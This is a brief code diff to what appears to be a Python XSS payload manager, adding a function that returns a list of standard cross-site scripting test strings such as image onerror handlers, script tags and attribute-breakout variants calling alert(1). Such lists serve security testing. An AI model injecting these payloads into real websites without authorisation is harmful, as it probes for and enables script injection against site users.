@@ -256,3 +256,22 @@ if __name__ == "__main__":
     payloads.remove_payload("<script>alert('Updated XSS')</script>")
     payloads.save_to_file("payloads.json")
     payloads.load_from_file("payloads.json")
+
+# Add this function at the end of the file, after the if __name__ == "__main__" block
+
+def get_default_payloads() -> List[str]:
+    """
+    Return a list of default XSS payloads for DOM injection.
+    
+    Returns:
+        List[str]: List of payload strings
+    """
+    return [
+        "<img src=x onerror=alert(1)>",
+        "<script>alert(1)</script>",
+        "javascript:alert(1)",
+        "\"><img src=x onerror=alert(1)>",
+        "'><img src=x onerror=alert(1)>",
+        "alert(1)",
+        "eval('alert(1)')"
+    ]
